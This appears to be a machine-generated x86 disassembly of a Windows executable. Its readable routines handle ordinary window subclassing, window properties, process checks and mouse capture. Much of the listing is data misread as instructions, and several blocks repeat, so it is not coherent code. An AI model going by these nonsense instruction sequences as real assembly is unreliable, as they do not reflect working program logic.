ror [ edi + edx + 0xb010045 ] 0x54
inc edx
jbe r-xdata
jle r-xdata
insb
push edi
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
inc edx
outsd
jb r-xdata
sar [ eax + 0x16 ] 0x45
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
inc edx
jbe r-xdata
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
dec esi
popad
insd
mov eax eax
mov [ esi ] dl
inc ebp
add [ ecx ] al
or al 0x54
or cl [ eax ]
push esp
dec ecx
insd
in al dx
rcl [ ebp + eax * 2 + 0x45930000 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + edx + 0x17c0045 ] ah
add [ eax ] al
je r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax + eax * 4 + 0x45 ] dh
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
outsd
insb
jae r-xdata
sub eax 0x2c002b00
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
inc ebp
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax ] al
add [ eax ] al
in al dx
sbb [ ebp ] al
nop
sbb eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add bh bh
jmp [ eax + ebx ]
sub_4516a6
push esp
inc edx
jbe r-xdata
outsd
jo r-xdata
insb
inc ebx
jne r-xdata
or [ edx + 0x65 ] ah
inc edx
outsd
je r-xdata
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x6004516 ] ah
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
dec esp
outsd
ja r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
inc esp
pop ss
inc ebp
pop ss
inc ebp
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
push ss
inc ebp
add [ ebx + 0x451748c0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
call 0xffffffff8b455c59
ror [ eax + 0x17 ] 0x45
add eax ebp
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
sbb [ ebp ] eax
outsd
insb
jae r-xdata
mov eax eax
mov [ edi ] ss
inc ebp
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
outsb
je r-xdata
inc ebx
outsd
jb r-xdata
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add [ edi + edx + 0x45 ] al
add [ eax ] al
outsd
insb
jae r-xdata
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x54004581 ] bl
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
inc ebp
add [ edx + eax ] al
add [ eax ] al
hlt
pop es
ror [ edi + edx + 0xb010045 ] 0x54
inc edx
jbe r-xdata
jle r-xdata
insb
push edi
inc edx
jbe r-xdata
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
or cl [ eax ]
push esp
dec ecx
insd
dec esi
popad
insd
mov eax eax
mov [ esi ] dl
inc ebp
add [ ecx ] al
or al 0x54
inc edx
outsd
jb r-xdata
in al dx
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax + eax * 4 + 0x45 ] dh
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
outsd
insb
jae r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al ch
push ss
inc ebp
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
jb r-xdata
rcl [ ebp + eax * 2 + 0x45930000 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + edx + 0x17c0045 ] ah
add [ eax ] al
je r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
add [ eax ] al
add [ eax ] al
in al dx
sbb [ ebp ] al
nop
sbb eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add bh bh
jmp [ eax + ebx ]
bound esp [ ebp + 0x54 ]
push ss
inc ebp
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
sub eax 0x2c002b00
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
inc ebp
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
sub_452230
pop edi
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080009 ] al
outsb
inc ebx
push 0x65676e61
add [ eax ] dl
inc eax
add [ edx ] al
add bh bh
inc edx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or edx [ ebx + 0x68 ]
popad
jb r-xdata
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
or [ esp + eax * 2 + 0x6f ] edx
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
dec ecx
insd
popad
jae r-xdata
xor al 0x40
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
adc [ eax ] al
xor al 0x0
add bh bh
push eax
sub al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x74646957
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x22
inc ebp
add [ eax ] ch
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
sub_45246c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x24
inc ebp
add [ eax ] ch
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ esp + ecx ] dl
inc esi
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
pop ss
inc edx
nop
or [ 0x45 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esi ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
and eax 0x2080045
add [ eax ] al
fcom [ edi ]
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x54004581 ] bl
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
rcl [ ebp + eax * 2 + 0x45930000 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ ebx + edx ] ah
inc esi
add [ eax ] ah
sub al [ eax ]
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ edi * 2 + 0x581c0045 ] al
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edx + ebx + 0x42 ] bh
add [ eax + eax * 4 + 0x45 ] dh
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
inc edx
add [ eax + 0x34 ] cl
inc eax
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x54004581 ] bl
into
inc ebp
insb
nop
adc [ esi ] ah
inc ebp
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
rcl [ ebp + eax * 2 + 0x45930000 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ ebx + edx ] ah
inc esi
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax ] ah
sub al [ eax ]
sbb eax 0x73754354
je r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
or eax 0x558b0048
or [ ecx + 0x18090 ] cl
insd
dec ebp
jne r-xdata
inc ecx
add [ eax ] cl
jpo r-xdata
insb
or [ 0x1b8c0045 ] ah
inc ebp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
add [ ecx + rw-data ] ah
mov eax [ eax + 0x18c ]
dec eax
add [ ebx - 0x6f76f7ab ] cl
add [ ecx ] 0x0
je r-xdata
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax + eax * 4 + 0x45 ] dh
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
inc edx
outsd
insb
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
add al al
add [ ebp + 0x26880040 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x45 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edi ] 0x45
add [ edx + eax ] cl
add [ eax ] al
mov esp 0x5c004524
sbb al [ edx ]
inc eax
xor al 0x40
add [ eax + 0x48004213 ] dh
xor al 0x40
push eax
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
outsd
insb
mov eax eax
movsb [ edi ] [ esi ]
daa
inc ebp
add [ edi ] al
sbb eax 0x73754354
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
insd
dec ebp
jne r-xdata
inc ebp
or [ eax - 0x18 ] dl
mov [ ecx - 0x5 ] al
[ ecx + 0x40000000 ]
je r-xdata
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
push eax
call GetWindowLongA
test eax eax
jne r-xdata
inc ebx
outsd
outsb
je r-xdata
inc ecx
sti
inc [ ebp - 0x74f08a40 ]
inc ebp
or [ eax + 0x6a ] dl
hlt
outsd
insb
mov [ esi ] ah
inc ebp
add [ esi ] cl
inc ebp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
dec ebx
inc ebx
sti
jmp [ ecx + rw-data ]
outsd
insb
jae r-xdata
add [ edx + 0x1ea8010 ] cl
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_4527ec
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_4528a4
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_4528d8
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40443c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_4528a4
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_452934
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_452b18
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c830
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_40449c
mov eax edi
mov edx esi
call sub_403fd0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_452b5c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c830
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_40449c
mov eax edi
mov edx esi
call sub_403fd0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_452ba0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_456c00
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_452c1c
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
mov eax ebx
call sub_45c380
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_452cc8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_418dc4
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_452cfc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45c380
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_452d24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_40276c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_452cfc
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_452cc8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418c68
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_418e40
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_452d80
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_418c9c
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418dc4
mov edx 0x8
call sub_40278c
inc esi
dec ebx
jne r-xdata
sub_452db4
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_418dc4
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_452cc8
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_452e18
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_452e78
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_40313c
mov edx esp
mov eax esi
call sub_4041e0
add esp 0x100
pop esi
pop ebx
retn
sub_452eb4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452f7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_453fd4
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_45395c
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406c9c
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_45395c
jmp r-xdata
sub eax 0x2
je r-xdata
